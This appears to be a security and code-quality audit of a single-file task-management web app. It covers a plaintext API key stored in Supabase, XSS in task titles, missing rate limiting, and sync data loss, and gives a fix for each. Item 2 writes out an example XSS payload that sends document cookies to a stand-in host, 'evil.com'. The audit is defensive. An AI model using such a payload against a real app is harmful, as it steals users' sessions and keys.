# Improvement Plan — Task OS / Arete / Givelink
> Generated 2026-09-28

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. Anthropic API key synced to Supabase in plain text
- **What**: `S.claudeKey` is a field of the global `S` object, which is serialized verbatim and pushed to Supabase on every sync.
- **Where**: `index.html:10408` (`sbPush` stores `data: S`), `index.html:2517` (claudeKey declared in S), `index.html:9917` (key saved into S)
- **Why it matters**: Every user's private Anthropic API key is stored in your database. A single DB leak exposes all of them. The key also travels in Supabase query responses back to any session.
- **Effort**: S
- **Suggested fix**:
  - Store the key in `localStorage` only (outside `S`), never in the S blob: `localStorage.setItem('taskos_api_key', k)` and read from there.
  - Strip `claudeKey` before push: `const {claudeKey, ...safeS} = S; push(safeS)`.
  - Remove `claudeKey` from the S default object at `index.html:2517`.

---

### 2. XSS via unescaped task/goal titles in innerHTML
- **What**: Several render functions interpolate `${t.title}` and `${g.title}` directly into `innerHTML` without calling `esc()`.
- **Where**: `index.html:3594` (weekly review done tasks), `index.html:3601` (backlog promote list), `index.html:3603` (goal progress step)
- **Why it matters**: A task or goal named `<img src=x onerror="fetch('evil.com?c='+document.cookie)">` executes arbitrary JS in the user's session. Self-XSS can exfiltrate API keys from localStorage.
- **Effort**: S
- **Suggested fix**:
  - Wrap every bare `${t.title}` / `${g.title}` in the three affected lines with `${esc(t.title)}` / `${esc(g.title)}`.
  - Audit all 81 other `innerHTML = \`...\`` assignments (found via `grep -n "innerHTML.*\\\${"`) for unescaped user content.

---

### 3. Push notification icon 404s (broken path in service worker)
- **What**: The service worker references `'./icons/icon-192.png'` for the push notification icon and badge, but the file lives at `./icon-192.png` (no `icons/` subdirectory).
- **Where**: `sw.js:46`, `sw.js:47`
- **Why it matters**: Push notifications silently show a broken/blank icon on every platform. On iOS this can prevent notifications from appearing at all.
- **Effort**: S
- **Suggested fix**:
  - Change both lines from `'./icons/icon-192.png'` to `'./icon-192.png'`.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 4. Zero rate limiting on the Claude API proxy
- **What**: `/api/claude.js` has no per-user rate limiting — the comment at line 12 says "For production add Upstash" but it was never added.
- **Where**: `api/claude.js:12–13`
- **Why it matters**: One bad actor (or an accidental loop) can exhaust your entire monthly Anthropic budget in minutes. There is no circuit breaker.
- **Effort**: M
- **Suggested fix**:
  - Add Upstash Redis rate limiting: `npm install @upstash/ratelimit @upstash/redis`.
  - Rate limit by Supabase UID (already verified in the auth check): 20 requests/minute per user.
  - Return HTTP 429 with `Retry-After` when exceeded.

---

### 5. Supabase sync uses last-write-wins, silently losing data on multi-device use
- **What**: `sbSyncNow` compares only `_updatedAt` timestamps and does `S = {...S, ...remote.data}` — the device with the older timestamp loses all its changes.
- **Where**: `index.html:10418–10420`
- **Why it matters**: A user who captures tasks on mobile, then opens the desktop — the mobile tasks vanish with no warning. This is a trust-destroying silent data loss.
- **Effort**: M
- **Suggested fix**:
  - For arrays (tasks, goals, habits): merge by `id`, deduplicating with the later `updatedAt` winning per item.
  - For scalar fields: last-write-wins is fine.
  - At minimum: show a toast "X tasks on another device were merged" when merging, so the user knows a sync happened.

---

### 6. Givelink sprint board prompts for API key via `window.prompt()` and stores in localStorage
- **What**: The AI Sprint Planner and AI features in `givelink.html` use `window.prompt()` to collect the Anthropic API key, then store it in `localStorage`.
- **Where**: `givelink.html:1154–1155`, `givelink.html:1326–1330`
- **Why it matters**: `window.prompt()` is a jarring UX that breaks on some mobile browsers; the key lives in localStorage, visible to any JS running on the page (XSS above makes this worse).
- **Effort**: S
- **Suggested fix**:
  - Read the key from the same place `index.html` does: `APP_CONFIG.aiProxy` (proxy path) or `localStorage.getItem('taskos_api_key')`.
  - If the key is missing, redirect the user to `index.html#settings` with a toast instead of prompting.

---

### 7. Silent AI JSON parse failure in health coach (user sees nothing)
- **What**: The health AI action handler at line 9242 catches a JSON parse failure with an empty catch, leaving `act` undefined and the handler silently doing nothing.
- **Where**: `index.html:9242`
- **Why it matters**: When the model returns a malformed response (which happens), the user gets no feedback, no error, no retry prompt — just silence.
- **Effort**: S
- **Suggested fix**:
  - Replace `catch(e){}` with `catch(e){ toast('Could not interpret that response — try again'); return; }`.
  - Consider logging `console.warn('health AI parse failed', raw)` for debugging.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 8. 14,926-line monolithic HTML file with no build system
- **What**: `index.html` is a single file containing all HTML structure, ~800 lines of CSS, and ~13,000+ lines of JavaScript.
- **Where**: `index.html` (entire file)
- **Why it matters**: Every feature addition risks breaking unrelated code. There is no module system, no tree-shaking, no type safety, no linting. Finding the source of a bug requires grepping a 15K-line file.
- **Effort**: L
- **Suggested fix**:
  - Start by extracting CSS to `app.css` and the `<script>` block to `app.js` with a `<script type="module" src="app.js">`.
  - No framework needed; even just having separate files with ES module imports would dramatically improve navigability.
  - Long-term: consider Vite for bundling, which requires minimal config for vanilla JS.

---

### 9. Hardcoded model ID in Claude proxy
- **What**: `'claude-haiku-4-5-20251001'` is hardcoded in `api/claude.js` at line 42.
- **Where**: `api/claude.js:42`
- **Why it matters**: When this model version is deprecated, all AI proxy calls will start returning errors. Updating it requires a code deploy.
- **Effort**: S
- **Suggested fix**:
  - Add `CLAUDE_MODEL` as a Vercel environment variable.
  - Change line 42 to: `model: process.env.CLAUDE_MODEL || 'claude-haiku-4-5-20251001'`.

---

### 10. Anthropic API called directly from browser with `dangerous` flag
- **What**: When no proxy is configured, `callClaude` calls `https://api.anthropic.com/v1/messages` directly from the browser using `anthropic-dangerous-direct-browser-access: true`.
- **Where**: `index.html:5020–5024`
- **Why it matters**: This flag is explicitly documented as dangerous because it exposes the API key in the browser's network tab. It is fine for self-hosted development but should not be the fallback for any deployed app.
- **Effort**: M
- **Suggested fix**:
  - In hosted/production mode (`_hostedMode()` returns true), require `APP_CONFIG.aiProxy` and never fall back to the direct path.
  - Show a clear error: "AI features require the server proxy — contact the admin."
  - Keep the direct path only for the self-hosted developer setup documented in the README.

---

### 11. Credentials and all user data serialized as a single localStorage blob
- **What**: `S` is a single ~80-property object that mixes task data, habits, finance, and sensitive fields (claudeKey, Supabase credentials). It is serialized together on every `save()`.
- **Where**: `index.html:2517` (S definition), `index.html:2578–2588` (save function)
- **Why it matters**: Any `localStorage.setItem` quota error (`index.html:2582`) discards the entire state at once. There is no way to partially recover. Credentials are co-mingled with personal data in the Supabase sync payload.
- **Effort**: L
- **Suggested fix**:
  - Minimum viable fix: strip all credential fields before serialization/sync (see item 1).
  - Longer term: split `S` into domain stores (`taskData`, `settings`, `credentials`) with separate `localStorage` keys so a quota error only affects one domain.

---

## 💡 P3 — Nice to have

### 12. Service worker cache version requires manual bumping on every deploy
- **What**: `const CACHE = 'arete-20260723'` — this is a hardcoded date string that must be manually updated to bust the service worker cache after each deploy.
- **Where**: `sw.js:1`
- **Why it matters**: Deploying new HTML/JS without bumping the cache key means some users will get the old service worker and stale content for hours or days. This is already 2 months old.
- **Effort**: S
- **Suggested fix**:
  - Use a Vercel build-time substitution, or a deploy script that writes `const CACHE = 'arete-${DATE}'` based on `$(date +%Y%m%d%H%M%S)` before committing.

---

### 13. Brand color split between landing page (indigo #5a49e0) and app (blue #3b82f6)
- **What**: `landing.html` uses `--accent:#5a49e0` (indigo-purple, Arete brand). `index.html` and `givelink.html` use `--accent:#3b82f6` (Tailwind blue-500, old brand).
- **Where**: `index.html:17`, `givelink.html:17`, `landing.html:48`
- **Why it matters**: Users who click "Try free" from the landing page arrive in a visually different-looking app. This breaks the brand story and reduces conversion trust.
- **Effort**: S
- **Suggested fix**:
  - Update `--accent` and `--accent2` in `index.html` and `givelink.html` `:root` to match `#5a49e0` / `#6f54e8`.
  - Verify buttons, progress bars, and active nav items render correctly with the new color.

---

### 14. Canonical URL and Open Graph point to raw Vercel subdomain
- **What**: `<link rel="canonical">` and all OG meta tags reference `https://task-management-beige-eight.vercel.app/`, not a branded domain.
- **Where**: `landing.html:11`, `landing.html:16–17`
- **Why it matters**: SEO credit splits between the Vercel URL and any future custom domain. The URL also appears in social share previews, which hurts brand perception.
- **Effort**: S
- **Suggested fix**:
  - Set up a custom domain in Vercel (e.g. `app.areteapp.io`).
  - Replace all occurrences of `task-management-beige-eight.vercel.app` in `landing.html`, `sitemap.xml`, and `MARKETING.md`.
